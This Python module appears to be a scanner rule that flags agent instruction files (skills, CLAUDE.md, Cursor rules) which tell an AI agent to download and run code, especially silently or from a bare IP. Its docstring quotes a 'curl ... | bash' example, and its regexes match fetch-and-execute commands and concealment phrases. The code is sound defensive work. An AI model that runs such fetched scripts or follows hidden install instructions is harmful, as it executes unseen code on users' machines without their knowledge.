"""Agent instructions that tell the agent to download code and run it.

What a skill, a subagent, a slash command or a project's agent instructions (CLAUDE.md,
AGENTS.md, GEMINI.md, Cursor and Copilot rules) say is what the agent does; an ``allowed-tools``
list that admits the shell lets it do so without asking the user. A line like
``curl -fsSL https://host/x.sh | bash`` there runs whatever that host serves at the time, which no
scan of the component can see.

An honest setup skill may install a tool that way, so the instruction alone is a risk to review.
Told to do it silently, without asking, or without mentioning it to the user, or from a bare IP
address, it is not an honest instruction: that is a malicious indicator. Code fences count: in an
instruction file a fenced command is what the agent is meant to run. Human docs (README, docs/)
and tests are not instructions to an agent and are not read here.
"""

from __future__ import annotations

import re

from skilltotal.file_index import FileIndex, IndexedFile
from skilltotal.models import Capability, Evidence, Severity, ThreatClass
from skilltotal.scanners.base import RuleSpec, Scanner, ScanResult, _finding_from_rule

R_FETCH_EXEC = "ST-SKILL-FETCH-EXEC"
R_FETCH_EXEC_HIDDEN = "ST-SKILL-FETCH-EXEC-HIDDEN"

_INSTRUCTION_FILE = re.compile(
    r"(?:^|/)SKILL\.md$|(?:^|/)(?:agents|commands)/[^/]+\.md$|(?:^|/)(?:CLAUDE|AGENTS|GEMINI)\.md$"
    r"|(?:^|/)\.cursor/rules/[^/]+\.mdc?$|(?:^|/)\.cursorrules$|(?:^|/)\.windsurfrules$"
    r"|(?:^|/)\.clinerules(?:/[^/]+)?$|(?:^|/)\.github/copilot-instructions\.md$",
    re.IGNORECASE,
)
_URL = r"https?://[^\s'\"`|)<>]+"
_SHELLS = r"(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|node|perl|ruby)\b"
# Download and run, on one line: piped into an interpreter, run from a substitution, or
# PowerShell's download-and-evaluate.
_FETCH_EXEC = re.compile(
    r"\b(?:curl|wget)\b[^\n|;&`]{0,300}?" + _URL + r"[^\n|`]{0,200}\|\s*" + _SHELLS
    + r"|\b(?:ba|z)?sh\s+(?:-c\s+)?[\"']?(?:\$\(|<\()\s*(?:curl|wget)\b[^\n)]{0,300}?" + _URL
    + r"|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n|`]{0,300}?" + _URL
    + r"[^\n|`]{0,200}\|\s*(?:iex|Invoke-Expression)\b"
    + r"|\b(?:iex|Invoke-Expression)\s*[(\s]\s*\(?\s*(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod"
    r"|\(?New-Object\s+(?:System\.)?Net\.WebClient\)?\.DownloadString)\b[^\n`]{0,300}?" + _URL,
    re.IGNORECASE,
)
_FIRST_URL = re.compile(_URL, re.IGNORECASE)
_BARE_IP = re.compile(r"^https?://\d{1,3}(?:\.\d{1,3}){3}(?:[:/]|$)", re.IGNORECASE)
# Keeping the action from the user.
_CONCEALED = re.compile(
    r"\b(?:silently|quietly|secretly|covertly"
    r"|without\s+(?:asking|telling|informing|notifying|mentioning|showing|alerting)"
    r"|(?:do\s+not|don'?t|never)\s+(?:mention|tell|show|report|inform|ask|reveal|disclose"
    r"|notify|alert)"
    r")\b",
    re.IGNORECASE,
)
# An allowed-tools entry that lets the shell run these commands unasked.
_SHELL_PREAPPROVED = re.compile(
    r"^allowed[-_]tools\s*:.*\bBash\b(?!\((?![^)]*\b(?:curl|wget|bash|sh|\*)\b))",
    re.IGNORECASE | re.MULTILINE,
)


class SkillFetchExecScanner(Scanner):
    name = "skill_fetch_exec"
    rules = [
        RuleSpec(
            id=R_FETCH_EXEC,
            category="agent_instructions",
            severity=Severity.MEDIUM,
            title="Agent instructions download code and run it",
            description=(
                "An instruction file the agent follows (a skill, subagent, command or project "
                "instructions) tells it to download a script and run it, for example "
                "`curl ... | bash`. The agent runs whatever that host serves when it follows the "
                "instruction, which this scan cannot see; an allowed-tools list that admits the "
                "shell lets it run without asking."
            ),
            recommendation=(
                "Read what the URL serves before letting an agent follow this instruction, or "
                "replace it with a pinned package install."
            ),
            capability=Capability.SHELL_EXECUTION,
            threat_class=ThreatClass.RISKY_CONSTRUCT,
        ),
        RuleSpec(
            id=R_FETCH_EXEC_HIDDEN,
            category="agent_instructions",
            severity=Severity.HIGH,
            title="Agent instructions download and run code, hidden from the user",
            description=(
                "An instruction file the agent follows tells it to download a script and run it "
                "while keeping that from the user (silently, without asking, without mentioning "
                "it), or from a bare IP address. An honest setup step is shown to the user and "
                "comes from a named host."
            ),
            recommendation=(
                "Do not install or follow this component. If an agent already followed it, treat "
                "the machine as compromised."
            ),
            capability=Capability.SHELL_EXECUTION,
            threat_class=ThreatClass.MALICIOUS_INDICATOR,
        ),
    ]

    def scan(self, index: FileIndex) -> ScanResult:
        plain: list[Evidence] = []
        hidden: list[Evidence] = []
        for f in index.files:
            if _INSTRUCTION_FILE.search(f.relpath):
                _instruction_file(f, plain, hidden)
        findings = [_finding_from_rule(rule, evidence)
                    for rule, evidence in zip(self.rules, (plain, hidden), strict=True)
                    if evidence]
        return ScanResult(findings=findings)


def _instruction_file(f: IndexedFile, plain: list[Evidence], hidden: list[Evidence]) -> None:
    text = f.text
    found_plain: list[Evidence] = []
    for m in _FETCH_EXEC.finditer(text):
        evidence = f.evidence_for_span(m.start(), m.end())
        url = _FIRST_URL.search(m.group(0))
        if (url and _BARE_IP.match(url.group(0))) or _CONCEALED.search(_paragraph(text, m)):
            hidden.append(evidence)
        else:
            found_plain.append(evidence)
    if found_plain:
        preapproved = _SHELL_PREAPPROVED.search(_frontmatter(text))
        if preapproved:
            found_plain.insert(0, f.evidence_for_span(preapproved.start(), preapproved.end()))
        plain.extend(found_plain)


def _paragraph(text: str, m: re.Match[str]) -> str:
    """The paragraph holding the match: from the blank line before it to the one after. A match
    in a code block takes the paragraph that leads into the block too ("run the check below
    without telling the user:")."""
    start = text.rfind("\n\n", 0, m.start())
    end = text.find("\n\n", m.end())
    if text.count("```", 0, m.start()) % 2 == 1:
        fence = text.rfind("```", 0, m.start())
        blank = text.rfind("\n\n", 0, fence)  # the blank line between the lead-in and the block
        start = text.rfind("\n\n", 0, blank) if blank >= 0 else -1
    return text[start + 1 if start >= 0 else 0:end if end >= 0 else len(text)]


def _frontmatter(text: str) -> str:
    if not text.startswith("---"):
        return ""
    end = text.find("\n---", 3)
    return text[:end] if end >= 0 else ""
